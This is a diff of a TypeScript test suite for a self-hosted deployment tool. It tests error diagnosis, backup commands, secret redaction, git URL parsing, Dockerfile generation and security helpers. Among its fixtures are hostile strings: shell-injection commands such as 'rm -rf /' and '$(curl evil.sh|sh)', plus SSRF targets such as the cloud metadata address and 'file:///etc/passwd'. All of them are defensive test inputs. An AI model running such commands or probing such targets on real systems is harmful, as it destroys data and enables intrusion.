@@ -25,9 +25,30 @@ import {
   dumpCommandFor,
   backupExtension,
 } from "../src/lib/backup-format"
-import { redactSecretValue, normalizeCommitSha, REDACTED } from "../src/lib/sanitize-fields"
-import { parseGitSource, isLikelyPublicHost, canonicalGitUrl } from "../src/lib/git-source"
-import { detectStack, type DetectionInput } from "../src/lib/stack-detect"
+import { redactSecretValue, normalizeCommitSha, redactSecretUrl, REDACTED } from "../src/lib/sanitize-fields"
+import {
+  normalizeGitSource,
+  detectStackFromFiles,
+  refineNodeStack,
+  findDockerfile,
+  generateDockerfile,
+  parseExposePort,
+} from "../src/lib/git-deploy"
+import {
+  validIp,
+  isPrivateIp,
+  validateWebhookUrl,
+  scrub,
+  REDACTED as SEC_REDACTED,
+  encryptSecret,
+  decryptSecret,
+  tokenDigest,
+  mintToken,
+  hasShellMetachars,
+  execFormArgv,
+  shellQuote,
+} from "../src/lib/security"
+import { deriveCertStatus, reachabilityFromProbe } from "../src/lib/status"
 
 let n = 0
 const ok = (name: string) => console.log(`  ✓ ${name}`)
@@ -57,9 +78,27 @@ check("context canceled → daemon cause", () => {
 
 check("401 / Authentication failed → private/stale-token cause", () => {
   const d = diagnoseDeployError("fatal: could not read Username: Authentication failed for repo (401)")
-  assert.ok(d && /private or the token is stale/i.test(d.cause))
+  assert.ok(d && /Clone failed/i.test(d.cause) && /private|token|stale/i.test(d.cause))
 })
 
+check("Remote branch not found → branch cause", () => {
+  const d = diagnoseDeployError(
+    "warning: Could not find remote branch main to clone.\nfatal: Remote branch main not found in upstream origin"
+  )
+  assert.ok(d && /branch/i.test(d.cause))
+})
+
+check("missing Dockerfile → dockerfile cause", () => {
+  const d = diagnoseDeployError("failed to read dockerfile: open Dockerfile: no such file or directory")
+  assert.ok(d && /Dockerfile/i.test(d.cause))
+})
+
+check("BuildKit --mount on legacy builder → buildkit cause", () => {
+  const d = diagnoseDeployError(
+    "DEPRECATED: The legacy builder is deprecated\nthe --mount option requires BuildKit"
+  )
+  assert.ok(d && /BuildKit/i.test(d.cause))
+})
 check("missing dynamic yml → routing-config cause", () => {
   const d = diagnoseDeployError("open app-foo-bar-abc.yml: no such file or directory")
   assert.ok(d && /Routing config/.test(d.cause))
@@ -241,6 +280,25 @@ check("dumpCommandFor: every supported engine writes the target file", () => {
   }
 })
 
+check("dumpCommandFor: piped dumps enable pipefail so a failed dump isn't recorded as success", () => {
+  const row = { username: "slipway", password: "p@ssw0rd", dbName: "app" }
+  for (const kind of ["postgres", "mysql", "mariadb", "mongodb"]) {
+    const spec = dumpCommandFor(kind, row, "/backups/x.gz", 5432)
+    assert.ok(spec, `${kind} must be dumpable`)
+    // Without pipefail, `false | gzip` exits 0 and produces a valid archive.
+    assert.ok(
+      /set\s+-o\s+pipefail/.test(spec!.cmd),
+      `${kind} dump pipeline must set pipefail: ${spec!.cmd}`
+    )
+  }
+  // redis/valkey write the rdb directly — no pipe, so pipefail is unnecessary
+  for (const kind of ["redis", "valkey"]) {
+    const spec = dumpCommandFor(kind, row, "/backups/x.rdb", 6379)
+    assert.ok(spec)
+    assert.ok(!spec!.cmd.includes("|"), `${kind} must not pipe through gzip`)
+  }
+})
+
 check("dumpCommandFor: unsupported engines refuse instead of faking a dump", () => {
   const row = { username: "sa", password: "x", dbName: "d" }
   assert.equal(dumpCommandFor("mssql", row, "/backups/x", 1433), null)
@@ -268,6 +326,25 @@ check("redactSecretValue: matching is case-insensitive", () => {
   }
 })
 
+check("redactSecretValue: trailing .pass / :pass keys are redacted without false positives", () => {
+  assert.equal(redactSecretValue("smtp.pass", "x"), REDACTED)
+  assert.equal(redactSecretValue("server:1:pass", "x"), REDACTED)
+  assert.equal(redactSecretValue("compass", "keep"), "keep")
+  assert.equal(redactSecretValue("bypass", "keep"), "keep")
+})
+
+check("redactSecretUrl: strips userinfo, token query params, and webhook path secrets", () => {
+  assert.equal(
+    redactSecretUrl("https://user:secret@hooks.example/hooks/abc"),
+    "https://redacted:redacted@hooks.example/hooks/[redacted]"
+  )
+  assert.ok(redactSecretUrl("https://discord.com/api/webhooks/123/tokensecret").includes(REDACTED))
+  const withQuery = redactSecretUrl("https://example.com/hook?token=abc")
+  assert.ok(!withQuery.includes("token=abc"), `token value leaked: ${withQuery}`)
+  assert.ok(/token=/i.test(withQuery), `token param missing: ${withQuery}`)
+  assert.equal(redactSecretUrl("not a url"), REDACTED)
+})
+
 check("normalizeCommitSha: keeps real object ids, discards everything else", () => {
   assert.equal(normalizeCommitSha("a3f9c21"), "a3f9c21") // short
   assert.equal(normalizeCommitSha("A3F9C21"), "a3f9c21") // normalised to lower
@@ -285,170 +362,179 @@ check("normalizeCommitSha: returns empty rather than inventing a commit", () => 
   assert.equal(normalizeCommitSha("0".repeat(41)), "") // too long
 })
 
-// ── git-source: every form people actually paste ───────────────────────────
-// Regression: the pipeline took its build context from the request body, which
-// the Deploy button never sends, so it fell through to "." and every git deploy
-// died with `lstat /app/Dockerfile: no such file or directory`.
-check("parseGitSource: the common GitHub forms all resolve to one clone URL", () => {
-  const expected = "https://github.com/owner/repo.git"
-  for (const input of [
-    "https://github.com/owner/repo",
-    "https://github.com/owner/repo.git",
-    "https://github.com/owner/repo/",
-    "http://github.com/owner/repo",
-    "git@github.com:owner/repo.git",
-    "ssh://git@github.com/owner/repo.git",
-    "github.com/owner/repo",
-    "owner/repo",
-    "  https://github.com/owner/repo  ",
-  ]) {
-    const got = parseGitSource(input)
-    assert.ok(got, `should parse: ${input}`)
-    assert.equal(got!.cloneUrl, expected, `wrong clone URL for ${input}`)
-    assert.equal(got!.slug, "owner/repo")
+// ── git-deploy: public repo URL normalisation + Dockerfile generation ───────
+check("normalizeGitSource: accepts bare github.com/org/repo and https forms", () => {
+  const a = normalizeGitSource("github.com/vercel/next.js", "canary")
+  assert.ok(a)
+  assert.equal(a!.cloneUrl, "https://github.com/vercel/next.js.git")
+  assert.equal(a!.dockerGitUrl, "https://github.com/vercel/next.js.git#canary")
+  assert.equal(a!.owner, "vercel")
+  assert.equal(a!.repo, "next.js")
+  assert.equal(a!.branch, "canary")
+
+  const b = normalizeGitSource("https://github.com/org/repo.git")
+  assert.equal(b!.cloneUrl, "https://github.com/org/repo.git")
+  assert.equal(b!.branch, "main")
+
+  const c = normalizeGitSource("git@github.com:org/repo.git", "develop")
+  assert.equal(c!.cloneUrl, "https://github.com/org/repo.git")
+  assert.equal(c!.branch, "develop")
+})
+
+check("normalizeGitSource: parses GitHub tree URLs into branch + subdir", () => {
+  const g = normalizeGitSource("https://github.com/org/repo/tree/feat/apps/web")
+  assert.ok(g)
+  assert.equal(g!.branch, "feat")
+  assert.equal(g!.subdir, "apps/web")
+  assert.equal(g!.dockerGitUrl, "https://github.com/org/repo.git#feat:apps/web")
+})
+
+check("normalizeGitSource: rejects empty / non-http schemes", () => {
+  assert.equal(normalizeGitSource(""), null)
+  assert.equal(normalizeGitSource("ftp://github.com/org/repo"), null)
+  assert.equal(normalizeGitSource("not a url !!!"), null)
+})
+
+check("detectStackFromFiles + refineNodeStack: Dockerfile wins, else package.json/next", () => {
+  assert.equal(detectStackFromFiles(["Dockerfile", "package.json"]), "dockerfile")
+  assert.equal(detectStackFromFiles(["package.json", "src"]), "node")
+  assert.equal(detectStackFromFiles(["requirements.txt"]), "python")
+  assert.equal(detectStackFromFiles(["index.html"]), "static")
+  assert.equal(refineNodeStack('{"dependencies":{"next":"15.0.0"}}'), "nextjs")
+  assert.equal(refineNodeStack('{"dependencies":{"express":"4.0.0"}}'), "node")
+  assert.equal(findDockerfile(["readme.md", "Dockerfile"]), "Dockerfile")
+  assert.equal(findDockerfile(["readme.md"]), null)
+})
+
+check("generateDockerfile: produces EXPOSE for node/next/static, refuses unknown", () => {
+  const node = generateDockerfile({ stack: "node", startCmd: "node server.js" })
+  // R5: CMD is exec-form argv JSON — ["node","server.js"], so shell metachars
+  // are literal text, never interpreted. Assert the JSON form, not shell text.
+  assert.ok(node && /EXPOSE 3000/.test(node) && /"node","server\.js"|"node",\s*"server\.js"/.test(node))
+  const next = generateDockerfile({ stack: "nextjs" })
+  assert.ok(next && /NEXT_TELEMETRY_DISABLED/.test(next))
+  const stat = generateDockerfile({ stack: "static" })
+  assert.ok(stat && /nginx/.test(stat))
+  assert.equal(generateDockerfile({ stack: "unknown" }), null)
+  assert.equal(generateDockerfile({ stack: "rust" }), null)
+  assert.equal(parseExposePort("FROM x\nEXPOSE 8080\nCMD y"), 8080)
+})
+
+// R5: command injection — a build/start command carrying shell metacharacters
+// must NOT be emitted as an executable shell line.
+check("generateDockerfile: rejects shell-injection in build/start commands", () => {
+  const evil = generateDockerfile({ stack: "node", startCmd: "node x.js; rm -rf /" })
+  assert.equal(evil, null)
+  const evil2 = generateDockerfile({ stack: "node", buildCmd: "$(curl evil.sh|sh)" })
+  assert.equal(evil2, null)
+  const evil3 = generateDockerfile({ stack: "node", startCmd: "node `whoami`.js" })
+  assert.equal(evil3, null)
+  // safe commands still generate, and any emitted CMD is exec-form (no sh -c).
+  const ok = generateDockerfile({ stack: "node", startCmd: "node server.js" })
+  assert.ok(ok)
+  assert.ok(!/"sh",\s*"-c"/.test(ok), "CMD must be exec-form argv, not sh -c")
+})
+
+// ── security.ts helpers (R5/R6/R7) ──────────────────────────────────────────
+check("validIp: octet-range checked (999.999.999.999 rejected), IPv4+IPv6", () => {
+  assert.equal(validIp("999.999.999.999"), false)
+  assert.equal(validIp("256.0.0.1"), false)
+  assert.equal(validIp("104.214.169.39"), true)
+  assert.equal(validIp("::1"), true)
+  assert.equal(validIp("not-an-ip"), false)
+})
+
+check("isPrivateIp: loopback/private/link-local/metadata blocked, public allowed", () => {
+  for (const p of ["127.0.0.1", "10.1.2.3", "172.16.5.4", "192.168.1.1", "169.254.169.254", "0.0.0.0", "::1"]) {
+    assert.equal(isPrivateIp(p), true, `${p} must be private`)
   }
+  assert.equal(isPrivateIp("104.214.169.39"), false)
 })
 
-check("parseGitSource: web deep links carry the branch and subdirectory", () => {
-  const branch = parseGitSource("https://github.com/owner/repo/tree/develop")
-  assert.equal(branch!.ref, "develop")
-  assert.equal(branch!.subdir, undefined)
-
-  const sub = parseGitSource("https://github.com/owner/repo/tree/main/apps/web")
-  assert.equal(sub!.ref, "main")
-  assert.equal(sub!.subdir, "apps/web")
-
-  // Docker's own `#ref` and `#ref:dir` conventions
-  assert.equal(parseGitSource("https://github.com/owner/repo#v2")!.ref, "v2")
-  const both = parseGitSource("https://github.com/owner/repo#main:services/api")
-  assert.equal(both!.ref, "main")
-  assert.equal(both!.subdir, "services/api")
+check("validateWebhookUrl: blocks metadata/loopback/file/ftp, allows https", () => {
+  assert.equal(validateWebhookUrl("http://169.254.169.254/latest/meta-data").ok, false)
+  assert.equal(validateWebhookUrl("http://127.0.0.1:9000/hook").ok, false)
+  assert.equal(validateWebhookUrl("http://10.0.0.5/x").ok, false)
+  assert.equal(validateWebhookUrl("file:///etc/passwd").ok, false)
+  assert.equal(validateWebhookUrl("ftp://evil/x").ok, false)
+  assert.equal(validateWebhookUrl("gopher://x").ok, false)
+  assert.equal(validateWebhookUrl("https://hooks.slack.com/services/T/B/x").ok, true)
+  assert.equal(validateWebhookUrl("https://discord.com/api/webhooks/1/2").ok, true)
 })
 
-check("parseGitSource: non-GitHub hosts keep their host", () => {
-  assert.equal(parseGitSource("https://gitlab.com/g/p")!.cloneUrl, "https://gitlab.com/g/p.git")
-  assert.equal(parseGitSource("git@bitbucket.org:t/r.git")!.host, "bitbucket.org")
-  assert.equal(isLikelyPublicHost("github.com"), true)
-  assert.equal(isLikelyPublicHost("git.internal.corp"), false)
+check("scrub: redacts registry auth, jwt, password fields by default", () => {
+  const reg = [{ name: "ghcr", url: "ghcr.io", auth: "dXNlcjpwYXNzd29yZDEyMzQ1Njc4" }]
+  const out = scrub(reg) as { auth: string }[]
+  assert.equal(out[0].auth, SEC_REDACTED)
+  const rec = (v: unknown) => scrub(v) as Record<string, unknown>
+  assert.equal(rec({ jwt: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.sig" })["jwt"], SEC_REDACTED)
+  assert.equal(rec({ url: "https://ok" })["url"], "https://ok")
 })
 
-check("parseGitSource: rejects what isn't a repository", () => {
-  for (const bad of ["", "   ", "not a url", "https://github.com/owner", "ftp:"]) {
-    assert.equal(parseGitSource(bad), null, `should reject: ${JSON.stringify(bad)}`)
-  }
+check("encrypt/decrypt secret: round-trips, ciphertext never contains plaintext", () => {
+  process.env.SLIPWAY_MASTER_KEY = "a".repeat(64)
+  const pw = "sup3r-secret-db-password"
+  const enc = encryptSecret(pw)
+  assert.ok(enc.startsWith("v1:"))
+  assert.ok(!enc.includes(pw), "ciphertext must not contain the plaintext")
+  assert.equal(decryptSecret(enc), pw)
+  delete process.env.SLIPWAY_MASTER_KEY
 })
 
-// ── stack-detect: a repo without a Dockerfile is still deployable ──────────
-check("detectStack: a repo's own Dockerfile always wins and is never overwritten", () => {
-  const d = detectStack({ files: ["Dockerfile", "package.json", "src"], packageJson: { scripts: { start: "node ." } } })
-  assert.equal(d!.stack, "dockerfile")
-  assert.equal(d!.dockerfile, null, "must not generate a Dockerfile over the repo's own")
+check("tokenDigest/mintToken: sha256 index, slipway_ prefix, no plaintext reuse", () => {
+  const t = mintToken()
+  assert.ok(t.startsWith("slipway_") && t.length > 20)
+  const d = tokenDigest(t)
+  assert.equal(d.length, 64)
+  assert.notEqual(d, t)
 })
 
-check("detectStack: Next.js recognised by dependency or config file", () => {
-  const byDep = detectStack({ files: ["package.json"], packageJson: { dependencies: { next: "15" } } })
-  assert.equal(byDep!.stack, "nextjs")
-  assert.equal(byDep!.port, 3000)
-  assert.match(byDep!.dockerfile!, /EXPOSE 3000/)
-
-  const byConfig = detectStack({ files: ["package.json", "next.config.ts"], packageJson: {} })
-  assert.equal(byConfig!.stack, "nextjs")
+check("hasShellMetachars + execFormArgv + shellQuote", () => {
+  assert.equal(hasShellMetachars("node x.js; rm -rf /"), true)
+  assert.equal(hasShellMetachars("$(curl x|sh)"), true)
+  assert.equal(hasShellMetachars("node server.js"), false)
+  assert.deepEqual(execFormArgv('nginx -g "daemon off;"'), ["nginx", "-g", "daemon off;"])
+  assert.equal(shellQuote("it's"), "'it'\\''s'")
 })
 
-check("detectStack: plain Node app uses its own start script", () => {
-  const d = detectStack({ files: ["package.json"], packageJson: { scripts: { start: "node server.js" } } })
-  assert.equal(d!.stack, "node")
-  assert.match(d!.dockerfile!, /CMD \["npm", "run", "start"\]/)
-
-  // falls back to serve, then dev, when there is no start
-  const serve = detectStack({ files: ["package.json"], packageJson: { scripts: { serve: "x" } } })
-  assert.match(serve!.dockerfile!, /"serve"/)
-  const dev = detectStack({ files: ["package.json"], packageJson: { scripts: { dev: "x" } } })
-  assert.match(dev!.dockerfile!, /"dev"/)
+// ── status.ts derived model (META-RULE 2) ───────────────────────────────────
+check("deriveCertStatus: IP mode is never 'Cert pending' and never ACME", () => {
+  const https = deriveCertStatus({ hostname: "104.214.169.39", ssl: "managed", status: "pending", https: true, isIp: true })
+  assert.equal(https.state, "self-signed")
+  assert.equal(https.tone, "warn")
+  const http = deriveCertStatus({ hostname: "104.214.169.39", ssl: "disabled", status: "active", https: false, isIp: true })
+  assert.equal(http.state, "http")
 })
 
-check("detectStack: package manager follows the committed lockfile", () => {
-  const bun = detectStack({ files: ["package.json", "bun.lockb"], packageJson: { scripts: { start: "x" } } })
-  assert.equal(bun!.stack, "bun")
-  assert.match(bun!.dockerfile!, /oven\/bun/)
-
-  const pnpm = detectStack({ files: ["package.json", "pnpm-lock.yaml"], packageJson: { scripts: { start: "x" } } })
-  assert.match(pnpm!.dockerfile!, /pnpm install --frozen-lockfile/)
-
-  const yarn = detectStack({ files: ["package.json", "yarn.lock"], packageJson: { scripts: { start: "x" } } })
-  assert.match(yarn!.dockerfile!, /yarn install --frozen-lockfile/)
-
-  // npm ci needs a lockfile; without one it must not be used
-  const noLock = detectStack({ files: ["package.json"], packageJson: { scripts: { start: "x" } } })
-  assert.match(noLock!.dockerfile!, /npm install/)
-  assert.ok(!/npm ci/.test(noLock!.dockerfile!))
-  const withLock = detectStack({ files: ["package.json", "package-lock.json"], packageJson: { scripts: { start: "x" } } })
-  assert.match(withLock!.dockerfile!, /npm ci/)
+check("deriveCertStatus: custom (self-signed) cert shows Self-signed, never pending", () => {
+  const s = deriveCertStatus({ hostname: "app.example.com", ssl: "custom", status: "active", https: true })
+  assert.equal(s.state, "self-signed")
+  assert.equal(s.tone, "warn")
+  assert.match(s.reason || "", /self-signed/i)
 })
 
-check("detectStack: build-but-no-start is served as a static bundle", () => {
-  const d = detectStack({ files: ["package.json"], packageJson: { scripts: { build: "vite build" } } })
-  assert.equal(d!.stack, "static")
-  assert.match(d!.dockerfile!, /nginx/)
+check("deriveCertStatus: pending -> stuck after timeout; active is HTTPS; http for plain", () => {
+  const fresh = deriveCertStatus({ hostname: "app.example.com", ssl: "managed", status: "pending", https: true, createdAt: new Date(Date.now() - 60_000) })
+  assert.equal(fresh.state, "pending")
+  const old = deriveCertStatus({ hostname: "app.example.com", ssl: "managed", status: "pending", https: true, createdAt: new Date(Date.now() - 20 * 60 * 1000) })
+  assert.equal(old.state, "stuck")
+  assert.equal(old.tone, "warn")
+  const active = deriveCertStatus({ hostname: "app.example.com", ssl: "managed", status: "active", https: true })
+  assert.equal(active.state, "active")
+  const plain = deriveCertStatus({ hostname: "app.example.com", ssl: "disabled", status: "active", https: false })
+  assert.equal(plain.state, "http")
 })
 
-check("detectStack: non-Node ecosystems by marker file", () => {
-  const cases: Array<[string[], string, number]> = [
-    [["requirements.txt", "main.py"], "python", 8000],
-    [["pyproject.toml"], "python", 8000],
-    [["go.mod", "main.go"], "go", 8080],
-    [["Cargo.toml", "src"], "rust", 8080],
-    [["Gemfile"], "ruby", 3000],
-    [["composer.json"], "php", 80],
-    [["index.html", "style.css"], "static", 80],
-  ]
-  for (const [files, stack, port] of cases) {
-    const d = detectStack({ files })
-    assert.ok(d, `should detect ${stack} from ${files.join(",")}`)
-    assert.equal(d!.stack, stack)
-    assert.equal(d!.port, port)
-    assert.match(d!.dockerfile!, new RegExp(`EXPOSE ${port}`), `${stack} must EXPOSE ${port}`)
-  }
-})
-
-check("detectStack: every generated Dockerfile exposes a port so it can be published", () => {
-  const inputs: DetectionInput[] = [
-    { files: ["package.json"], packageJson: { dependencies: { next: "15" } } },
-    { files: ["package.json"], packageJson: { scripts: { start: "x" } } },
-    { files: ["requirements.txt"] },
-    { files: ["go.mod"] },
-    { files: ["Gemfile"] },
-    { files: ["index.html"] },
-  ]
-  for (const i of inputs) {
-    const d = detectStack(i)
-    assert.ok(d?.dockerfile, "expected a generated Dockerfile")
-    assert.match(d!.dockerfile!, /^EXPOSE \d+$/m, `no EXPOSE in ${d!.stack} Dockerfile`)
-  }
-})
-
-check("detectStack: unrecognised repo returns null rather than guessing", () => {
-  assert.equal(detectStack({ files: ["README.md", "LICENSE"] }), null)
-  assert.equal(detectStack({ files: [] }), null)
-})
-
-check("canonicalGitUrl: round-trips the ref and subdirectory a deep link carried", () => {
-  // plain repo -> plain clone URL
-  const plain = parseGitSource("https://github.com/owner/repo")!
-  assert.equal(canonicalGitUrl(plain), "https://github.com/owner/repo.git")
-
-  // a /tree/ deep link must not silently lose the branch or the subdirectory:
-  // storing only the clone URL would build the default branch at the repo root
-  const deep = parseGitSource("https://github.com/owner/repo/tree/dev/apps/api")!
-  const canonical = canonicalGitUrl(deep)
-  const reparsed = parseGitSource(canonical)!
-  assert.equal(reparsed.cloneUrl, deep.cloneUrl)
-  assert.equal(reparsed.ref, "dev")
-  assert.equal(reparsed.subdir, "apps/api")
-
-  // branch only
-  const branchOnly = parseGitSource("https://github.com/owner/repo/tree/release")!
-  assert.equal(parseGitSource(canonicalGitUrl(branchOnly))!.ref, "release")
+check("reachabilityFromProbe: reachable / 404 / tls / conn-fail mapped with hints", () => {
+  assert.equal(reachabilityFromProbe({ ok: true, code: 200, latencyMs: 12 }).state, "reachable")
+  const nf = reachabilityFromProbe({ ok: false, code: 404 })
+  assert.equal(nf.state, "http-error")
+  assert.match(nf.hint || "", /no route at '\//)
+  const tls = reachabilityFromProbe({ ok: false, error: "self signed certificate" })
+  assert.equal(tls.state, "tls-error")
+  const down = reachabilityFromProbe({ ok: false, error: "fetch failed: ECONNREFUSED" })
+  assert.equal(down.state, "connection-failed")
+  assert.match(down.hint || "", /crash-looping|port/i)
 })
 
 console.log(`\n  ${n} checks passed ✓`)
